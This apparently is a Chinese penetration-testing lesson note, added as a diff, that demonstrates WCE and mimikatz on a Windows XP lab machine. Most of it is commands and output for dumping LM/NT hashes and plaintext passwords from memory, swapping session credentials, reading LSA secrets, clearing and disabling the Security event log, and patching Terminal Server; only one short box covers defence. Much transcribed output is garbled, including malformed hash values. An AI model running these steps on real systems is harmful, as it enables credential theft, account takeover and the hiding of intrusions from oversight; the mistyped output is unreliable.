@@ -1,0 +1,555 @@
+课时46 WCE
+
+WINDOWS身份认证过程
+lmhash = LMHash("pwd1")
+nthash = NTHash("pwd1")
+
+╋━━━━━━━━━━━━━━━╋
+┃WCE(WINDOWS CREDENTIAL EDITOR)┃
+┃/usr/share/wce/               ┃
+┃需要管理员权限                ┃
+┃wceb-universal.exe -l / -lv   ┃
+┃wce-universal.exe -d          ┃
+┃wce-universal.exe -e / -r     ┃
+┃wce-universal.exe -g          ┃
+┃wce-universal.exe -w          ┃
+┃LM/NT hash                    ┃
+╋━━━━━━━━━━━━━━━╋
+
+root@kali:~# cd /usr/share/wce/
+
+root@kali:/usr/share/wce# ls
+getlsasrvaddr.exe  README  wce32.exe  wce64.exe  wce-universal.exe
+
+root@kali:/usr/share/wce# ls -l
+总用量 928
+-rw-r--r-- 1 root root  50176 11月 12  2013 getlsasrvaddr.exe
+-rw-r--r-- 1 root root   8614 7月  10  2013 README
+-rwxr-xr-x 1 root root 199168 11月 12  2013 wce32.exe
+-rwxr-xr-x 1 root root 217088 11月 12  2013 wce64.exe
+-rwxr-xr-x 1 root root 466944 7月  14  2013 wce-universal.exe
+
+root@kali:/usr/share/wce# cd ..
+
+root@kali:/usr/share# cp wce/ -R/media/sf_D_DRIVE
+
+C:\>whoami.exe
+
+C:\>net user a a /add
+
+C:\>net user b b /add
+
+C:\>cd wce
+
+C:\wce>wce-universal.exe -l
+WCE v1.41beta <Windows Credentials Editor> -  <c> 2010-2013 Anplia Security - by
+Hernan Ochoa <hernan@ampliasecurity.com>
+Use -h for help.
+
+yuanfh:XP:AAD3B435b51404EEAAD435B51404EE:31D6CFE0D16AE931B73C59D7E0C0089C0
+XP$:WORXGROUP:AAD30435B511404EEAAD3B435B61404EE:31D6CFE0D16AE931B73C59D7E0C089C0
+
+C:\wce>wce-universal.exe -l
+WCE v1.41beta <Windows Credentials Editor> -  <c> 2010-2013 Anplia Security - by
+Hernan Ochoa <hernan@ampliasecurity.com>
+Use -h for help.
+
+b:XP:902139606B6D16B5AAD3B435B51404EE:A047EE4A9DB8BC8B4F3F8A03X72DEB80
+a:xp:7584248B8D2C9F9EAAD3B435B51404EE:186CB09181E2C2ECAAC768C47C729904
+yuanfh:XP:AAD3B435b51404EEAAD435B51404EE:31D6CFE0D16AE931B73C59D7E0C0089C0
+XP$:WORXGROUP:AAD30435B511404EEAAD3B435B61404EE:31D6CFE0D16AE931B73C59D7E0C089C0
+
+C:\wce>wce-universal.exe -lv
+WCE v1.41beta <Windows Credentials Editor> -  <c> 2010-2013 Anplia Security - by
+Hernan Ochoa <hernan@ampliasecurity.com>
+Use -h for help.
+
+
+Current Logon Session LUID: 0000949h
+Reading from memory <safe mode>
+Error: unknown target!
+Reading by injecting code! <less-safe mode>
+Logon Sessions Found: 8
+XP\b:NTLM
+        LUID:0004BE06h
+XP\a:NTLM
+        LUID:0002D85Fh
+NT AUTHORITY\ANONYMOUS LOGON:NILM
+        LUID:00018AE0h
+XP\yuanfh:NTLM
+        LUID:00009494h
+NT AUTHORITY\LOCAL SERVICE:Negotiate
+        LUID:000003E5h
+NT AUTHORITY\NETWORK SERVICE:Negotiate
+        LUID:000003E4h
+\:NTLM
+        LUID:00006E32h
+WORKGROUP\XP$:NTLM
+        LUID:000003E7h
+
+0008E1E0:a:xp:7584248B8D2C9F9EAAD3B435B51404EE:186CB09181E2C2ECAAC768C47C729904
+0004BE06:b:XP:902139606B6D16B5AAD3B435B51404EE:A047EE4A9DB8BC8B4F3F8A03X72DEB80
+00009494:yuanfh:XP:AAD3B435b51404EEAAD435B51404EE:31D6CFE0D16AE931B73C59D7E0C0089C0
+000003E4:XP$:WORXGROUP:AAD30435B511404EEAAD3B435B61404EE:31D6CFE0D16AE931B73C59D7E0C089C0
+
+C:\wce>wce-universal.exe -h
+WCE v1.41beta <Windows Credentials Editor> -  <c> 2010-2013 Anplia Security - by
+Hernan Ochoa <hernan@ampliasecurity.com>
+Use -h for help
+
+-l              列出登录的会话和NTLM凭据（默认值）
+-s              修改当前登录会话的NTLM凭据 参数：<用户名>:<域名>:<LM哈希>:<NT哈希>
+-r              不定期的列出登录的会话和NTLM凭据，如果找到新的会话，那么每5秒重新列出一次
+-c              用一个特殊的NTML凭据运行一个新的会话 参数：<cmd>
+-e              不定期的列出登录的会话和NTLM凭据，当产生一个登录事件的时候重新列出一次
+-o              保存所有的输出到一个文件 参数:<文件名>
+-i              指定一个LUID代替使用当前登录会话 参数:<luid>
+-d              从登录会话中删除NTLM凭据 参数:<luid>
+-a              使用地址 参数: <地址>
+-f              强制使用安全模式
+-g              生成LM和NT的哈希 参数<密码>
+-K              缓存kerberos票据到一个文件（unix和windows wce格式）
+-k              从一个文件中读取kerberos票据并插入到windows缓存中
+-w              通过摘要式认证缓存一个明文的密码
+-v              详细输出
+
+
+C:\wce>wce-universal.exe -r
+WCE v1.41beta <Windows Credentials Editor> -  <c> 2010-2013 Anplia Security - by
+Hernan Ochoa <hernan@ampliasecurity.com>
+Use -h for help
+
+Refreshing every 5 seconds..
+
+b:XP:902139606B6D16B5AAD3B435B51404EE:A047EE4A9DB8BC8B4F3F8A03X72DEB80
+a:xp:7584248B8D2C9F9EAAD3B435B51404EE:186CB09181E2C2ECAAC768C47C729904
+yuanfh:XP:AAD3B435b51404EEAAD435B51404EE:31D6CFE0D16AE931B73C59D7E0C0089C0
+XP$:WORXGROUP:AAD30435B511404EEAAD3B435B61404EE:31D6CFE0D16AE931B73C59D7E0C089C0
+
+C:\:\wce>wce-universal.exe -e
+WCE v1.41beta <Windows Credentials Editor> -  <c> 2010-2013 Anplia Security - by
+Hernan Ochoa <hernan@ampliasecurity.com>
+Use -h for help
+
+b:XP:902139606B6D16B5AAD3B435B51404EE:A047EE4A9DB8BC8B4F3F8A03X72DEB80
+a:xp:7584248B8D2C9F9EAAD3B435B51404EE:186CB09181E2C2ECAAC768C47C729904
+yuanfh:XP:AAD3B435b51404EEAAD435B51404EE:31D6CFE0D16AE931B73C59D7E0C0089C0
+XP$:WORXGROUP:AAD30435B511404EEAAD3B435B61404EE:31D6CFE0D16AE931B73C59D7E0C089C0
+
+C:\:\wce>wce-universal.exe -d 0008E1E0
+WCE v1.41beta <Windows Credentials Editor> -  <c> 2010-2013 Anplia Security - by
+Hernan Ochoa <hernan@ampliasecurity.com>
+Use -h for help
+
+NTLM credentials successfully deleted!
+
+C:\wce>wce-universal.exe -r
+WCE v1.41beta <Windows Credentials Editor> -  <c> 2010-2013 Anplia Security - by
+Hernan Ochoa <hernan@ampliasecurity.com>
+Use -h for help.
+
+b:XP:902139606B6D16B5AAD3B435B51404EE:A047EE4A9DB8BC8B4F3F8A03X72DEB80
+yuanfh:XP:AAD3B435b51404EEAAD435B51404EE:31D6CFE0D16AE931B73C59D7E0C0089C0
+XP$:WORXGROUP:AAD30435B511404EEAAD3B435B61404EE:31D6CFE0D16AE931B73C59D7E0C089C0
+
+C:\wce>wce-universal.exe -g password
+WCE v1.41beta <Windows Credentials Editor> -  <c> 2010-2013 Anplia Security - by
+Hernan Ochoa <hernan@ampliasecurity.com>
+Use -h for help
+
+Password:  password
+Hashed:    E52CAC67419A9A224A3B108F3FA6CB6D:8846F7EAEE8FB117AD06BDD830B75866
+
+C:\wce>wce-universal.exe -w
+WCE v1.41beta <Windows Credentials Editor> -  <c> 2010-2013 Anplia Security - by
+Hernan Ochoa <hernan@ampliasecurity.com>
+Use -h for help
+
+a\XP:a
+b\XP:b
+yuanfh\XP:
+NETWORK SURVICE\WORKGROUP:
+
+C:\wce>wce-universal.exe -w
+WCE v1.41beta <Windows Credentials Editor> -  <c> 2010-2013 Anplia Security - by
+Hernan Ochoa <hernan@ampliasecurity.com>
+Use -h for help
+
+yuanfh\XP:password0123456
+a\XP:a
+b\XP:b
+yuanfh\XP:
+NETWORK SURVICE\WORKGROUP:
+
+C:\wce>wce-universal.exe -i 0004BE06 -s AAD30435B511404EEAAD3B435B61404EE:31D6CFE0D16AE931B73C59D7E0C089C0
+WCE v1.41beta <Windows Credentials Editor> -  <c> 2010-2013 Anplia Security - by
+Hernan Ochoa <hernan@ampliasecurity.com>
+Use -h for help
+
+CHANGING NTLM credentials of logon seesion 0004BE06h to:
+Username: yuanfh
+domain: XP
+LMHash: AAD30435B511404EEAAD3B435B61404EE
+NTHash: 31D6CFE0D16AE931B73C59D7E0C089C0
+NTLM credentials successfully deleted!
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃WCE(WINDOWS CREDENTIAL EDITOR)                                          ┃
+┃从内存读取LM / NTLM hash                                                ┃
+┃Digest Authentication Package                                           ┃
+┃NTLM Security Package                                                   ┃
+┃Kerberos Security Package                                               ┃
+┃防止WCE攻击                                                             ┃
+┃HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\SecurityPackages┃
+┃    kerberos                                                            ┃
+┃    msv1_0                                                              ┃
+┃    schannel                                                            ┃
+┃    wdigest                                                             ┃
+┃    tspkg                                                               ┃
+┃    pku2u                                                               ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+
+C:\wce>wce-universal.exe -w
+WCE v1.41beta <Windows Credentials Editor> -  <c> 2010-2013 Anplia Security - by
+Hernan Ochoa <hernan@ampliasecurity.com>
+Use -h for help
+
+
+Cannot read result from loader!
+Error in injectDLLAndCallFunction
+Cannot allocate RWX memory in remote process
+Error in injectDLLAndCallFunction
+Cannot allocate RWX memory in remote process
+Error in injectDLLAndCallFunction
+Cannot allocate RWX memory in remote process
+Error in injectDLLAndCallFunction
+Cannot allocate RWX memory in remote process
+Error in injectDLLAndCallFunction
+Cannot allocate RWX memory in remote process
+Error in injectDLLAndCallFunction
+
+╋━━━━━━━━━━━━━╋
+┃其他工具                  ┃
+┃pwdump localhost          ┃
+┃fgdump                    ┃
+┃mimikatz                  ┃
+┃privilege::debug #提升权限┃
+┃sekurlsa::logonPasswords  ┃
+┃::                        ┃
+╋━━━━━━━━━━━━━╋
+
+root@kali:/usr/share# cd /usr/share/windows-binaries/
+root@kali:/usr/share/windows-binaries# ls
+root@kali:/usr/share/windows-binaries# cp fgdump/ -R /media/sf_D_DRIVE/
+
+--------------------------------------------------------------------------------
+mimikatz
+
+大神们都知道的东西吧，渗透测试常用工具。法国一个牛B的人写的轻量级调试器，可以帮助安全测试人员抓取Windows密码。
+
+mimikatz 最近发布了它的2.0版本，抓密码命令更加简单了，估计作者也看到了对它这个神器最多的研究就是直接抓密码，为神马不发布一个直接一键版，哈哈哈哈哈。新功能还包括能够通过获取的kerberos登录凭据，绕过支持RestrictedAdmin模式的win8或win2012svr的远程终端(RDP) 的登陆认证。建议默认禁止RestrictedAdmin模式登录。更多功能等着大家来发现
+
+神器的博客http://blog.gentilkiwi.com/mimikatz     
+
+直达下载地址https://github.com/gentilkiwi/mimikatz/releases/tag/2.0.0-alpha-20140614
+--------------------------------------------------------------------------------------
+
+root@kali:/usr/share/windows-binaries# cd /usr/share/mimikatz
+
+root@kali:/usr/share/mimikatz# ls
+kiwi_passwords.yar  Win32  x64
+
+root@kali:/usr/share/mimikatz# cp Win32/ -R /media/sf_D_DRIVE/
+
+C:\Docouments and Settings\yuanfh>cd
+
+C:>cd Win32
+
+C:\Win32>mimikatz.exe
+
+  .#####.    mimikat 2.0 alpha (x64) release "Kiwi en C" (Jun 14 2014 22:54:17)
+ .## ^ ##.
+ ## / \ ##  /* * *
+ ## \ / ##   Benjamin DELPY 'gentilkiwi' (benjamin@gentilkiwi.com )
+ '## v ##'   http://blog.gentilkiwi.com/mimikatz
+  '#####'                                    with  14 modules * * */
+
+mimikatz # ::
+ERROR mimikatz_doLocal : "" module not found !
+
+         standard  -  Standard modult  [Basic commands <does not require module name>]
+           crypto  -  Crypto Module
+         sekurlas  -  SekurLSA module  [Some command to enumerate credentials...]
+         kerberos  -  Kerheros paskage module  []
+        privilege  -  Priviege module
+          process  -  Process module
+          service  -  Service module
+          lsadump  -  LsaDump module
+               ts  -  Terminal Server moduls
+            event  -  Event module
+             misc  -  Miscellaneous moduls
+            token  -  Token manipulation module
+            vault  -  Windows Vault/Credential module
+      minesweeper  -  MineSweeper module
+              net  -  
+            dpapi  -  DPAPI Module <by API or RAW access>  [Data Protection application programming int
+
+mimikatz # privilege::debug              //提升权限
+
+mimikatz # privilege::
+ERROR mimikatz_doLocal ; "<null>" command of "privileage" module not found !
+
+Module  :       privilege
+Full name  :    Privilege module
+
+           debug  -  Ask debug privilege
+
+mimikatz # sekurlsa::logonpasswords      //抓取密码
+
+mimikatz # sekurlsa::
+ERROR mimikatz_doLocal ; "<null>" command of "privileage" module not found !
+
+Module  :       sekurlas
+Full name  :    SekurLSA module
+Description  :  Some commands to enumerate credentials
+
+              msv  -  Lists LM & NTLM credentials
+          wdigest  -  Lists VDigest credentials
+         kerheros  -  Lists Xerberos credentials
+            tspky  -  Lists Tspky credentials
+          licessp  -  Lists LiveSSP credentials
+              ssp  -  Lists SSP credentials
+   logonPasswords  -  Lists all available providers credentials
+          process  -  Switch <or reinit> to LSASS process context
+         minidump  -  Switch <or reinit> to LSASS minidump context
+              pth  -  Pass-the-hash
+           krbtgt  -  krbtgt!
+      dpapisystem  -  DPAPI_SYSTEM secret
+          tickets  -  List Xerberos tickets
+            ekeys  -  List Xerberos Encryption Keys
+            dpapi  -  List Cached MasterKeys
+          credman  -  List Credentials Manager
+
+mimikatz # process::
+ERROR mimikatz_doLocal ; "<null>" command of "privileage" module not found !
+
+Module  :       process
+Full name  :    Process module
+
+             list  -  List process
+          exports  -  List exprots
+          imports  -  List imports
+            start  -  Start a process
+             stop  -  Terminate a process
+          suspend  -  Suspend a process
+           resume  -  Resume a process
+
+mimikatz # process::list
+0       <null>
+4       System
+488     smss.exe
+588     csrss.exe
+612     winlogon.exe
+656     services.exe
+668     lsass.exe
+828     VBoxService.exe
+872     svchost.exe
+956     svchost.exe
+100     svchost.exe
+1096    svchost.exe
+1216    svchost.exe
+1524    explorer.exe
+1536    spoolsv.exe
+1704    VBoxTray.exe
+1712    ctfmon.exe
+1108    SLadmin.exe
+1308    SLSmtp.exe
+2028    alg.exe
+552     cmd.exe
+560     conime.exe
+712     mimikatz.exe
+980     cmd.exe
+1160    csrss.exe
+1260    winlogon.exe
+1912    explorer.exe
+1304    msiexec.exe
+1244    VBoxTray.exe
+1636    ctfmon.exe
+316     csrss.exe
+1012    winlogon.exe
+2236    explorer.exe
+2672    VBoxTrat.exe
+2608    ctfmon.exe
+
+mimikatz # process::start calc
+Trying to start "calc" : OK ! <PID 3816>
+
+mimikatz # service::
+ERROR mimikatz_doLocal ; "<null>" command of "privileage" module not found !
+
+Module  :       service
+Full name  :    Service module
+
+            start  -  Start service
+           remove  -  Remove service
+             stop  -  Stop service
+          suspend  -  Suspend service
+           resume  -  Restume service
+      preshutdown  -  Preshutdown service
+         shutdown  -  Shutdown service
+             list  -  List services
+
+mimikatz # service::list
+
+mimikatz # lsadump::sam
+Domain : XP
+SysKey : w771e02f4713ehb2843a38204b21c964d
+ERROE kuhl_m_lsadump_getUserAdnSamKey : kull_m_registry_RegOpenKeyEx SAM Accounts <0x00000005>
+
+mimikatz # lsadump::
+ERROR mimikatz_doLocal ; "<null>" command of "privileage" module not found !
+
+Module  :       lsadump
+Full name  :    LsaDump module
+
+              sam  -  Cet the SysKey to decrypt SAM entries <from registry or hives>
+          secrets  -  Cet the SysKey to decrypt SECRETS entries <from registry or hives>
+            cache  -  Cet the SysKey to decrypt BK$KM then NSCacge<v2> <from registry or hives>
+              lsa  -  Ask LSA server to retrieve SAM/AD entries <normal, path on the fly ir inject>
+            trust  -  Ask LSA server to retrieve Tryst Auth Informaion <normal or pathc on the fly>
+             hash 
+       backupkeys 
+          repdata 
+
+mimikatz # lsadump::cache
+Domain : XP
+SysKey : w771e02f4713ehb2843a38204b21c964d
+ERROE kuhl_m_lsadump_getUserAdnSamKey : kull_m_registry_RegOpenKeyEx SAM Accounts <0x00000005>
+
+mimikatz # lsadump::lsa
+Domain : Xp / S-1-5-21-171886721-1708537768-789884787
+
+RID  : 000003ec <1004>
+USer : a
+ERROR kuhl_m_lsadump_lsa_user ; SanQuserInformationUser c00000003
+
+RID  : 000001f4 <500>
+USer : Administrator
+ERROR kuhl_m_lsadump_lsa_user ; SanQuserInformationUser c00000003
+
+RID  : 000003ed <1005>
+USer : b
+ERROR kuhl_m_lsadump_lsa_user ; SanQuserInformationUser c00000003
+
+RID  : 000001f5 <501>
+USer : Guest
+ERROR kuhl_m_lsadump_lsa_user ; SanQuserInformationUser c00000003
+
+RID  : 000003e8 <1000>
+USer : HelpAssistant
+ERROR kuhl_m_lsadump_lsa_user ; SanQuserInformationUser c00000003
+
+RID  : 000003ea <1002>
+USer : SUPPORT_388945a0
+ERROR kuhl_m_lsadump_lsa_user ; SanQuserInformationUser c00000003
+
+RID  : 000003eb <1003>
+USer : yuanfh
+ERROR kuhl_m_lsadump_lsa_user ; SanQuserInformationUser c00000003
+
+mimikatz # lsadump::trust
+
+Current domain: <null> <WORKGROUPERROR kulL_m_string_displaySID ; ConverSidToStringSid <0x000000057>
+ERROT kuhl_m_lsadump_trust ; LsaEnumerateTrustedDomainsEx c00002b1
+
+mimikatz # lsadump::hash
+NTLM: 31d6cfe0416ae931b73c59d7e9x089c0
+LM  : aad3b435b51404eeaad3b435b51404ee
+SHA1: da39a3ee5e6b4b0d3255bfef95601890afd80709
+MD5 : d41d8cd98f00b204e9800998ecf8427e
+
+mimikatz # ts::
+ERROR mimikatz_doLocal ; "<null>" command of "privileage" module not found !
+
+Module :         ts
+Full name :      Treminal Server module
+
+      multirdp - [experimental] patch Terminal Server service to allow multiples users
+
+mimikatz # ts::multirdp
+"TermService" service patched
+
+mimikatz # event::
+ERROR mimikatz_doLocal ; "<null>" command of "privileage" module not found !
+
+Module :        event
+Full name :     Event module
+            drop -  [experimental] patch Events service to avoid new events
+           clear -  Clear an event log
+
+mimikatz # event::clear
+Using "Security" event log :
+-0 event<s>
+-Cleared !
+-1 event<s>
+
+mimikatz # event::drop
+"EventLog" service patched
+
+mimikatz # misc::
+ERROR minikatz_doLocal ; "<null>"n command of "misc" module not found!
+
+Module :        misc
+Full name :     Miscellaneous moudule
+
+             end  -  Command Prompt           <withou DisableCMD>
+         regedit  -  Registry Editor          <withou DisableRegistryTools>
+         taskmgr  -  Task Manager             <withou DisableTaskMgr>
+      ncroutemon  -  Juniper Network Connect  <withou route monitoring>
+         detours  -  [experinental] Try to enumerate all moddules with Detours-like hooks
+            wifi
+          memssp
+        skeleton
+
+mimikatz # misc::end
+Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 4AD1495C
+
+mimikatz # misc::regedit
+Patcg OK for 'regedit.exe' from 'DisableRegistryTools' to 'KiwiAndRegistryTools' @ 01001904
+
+mimikatz # misc::wifi
+
+mimikatz # token
+ERROR minikate_doLocal ; "token" command of "standard" module not found !
+
+Module :        standard
+Full name :     Standard module
+Description :   Basic commands <does not require module name>
+
+            exit  -  Quit mimikatz
+             cls  -  Clear screen <doesn't work with redirection, like PsExec>
+          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everthing
+          coffee  -  Please, make me a coffee!
+           sleep  -  Sleep an omount of milliseconds
+             log  -  Log minikatz input/output to file
+          base64  -  Switch file output/base64 output
+         version  -  Display some version informations
+              cd  -  Change or display current directory
+         markuss  -  Mark about PtH
+
+mimikatz # token::
+ERROT mimikatz_doLocal ; "<null>" command of "token" module not found !
+
+Module :        token
+Full name :     Token manipulation module
+
+           whami  -  Display current identity
+            list  -  List all tokens of the system
+         elevate  -  Impersonate a token
+          revert  -  Revert to proces token
+
+mimikatz # token::whoami
+ * Process Token : 144276       XP\yuanfh      S-1-5-21-1715567821-1708537768-789884707-1003 <08g.z
+
+mimikatz # token::list
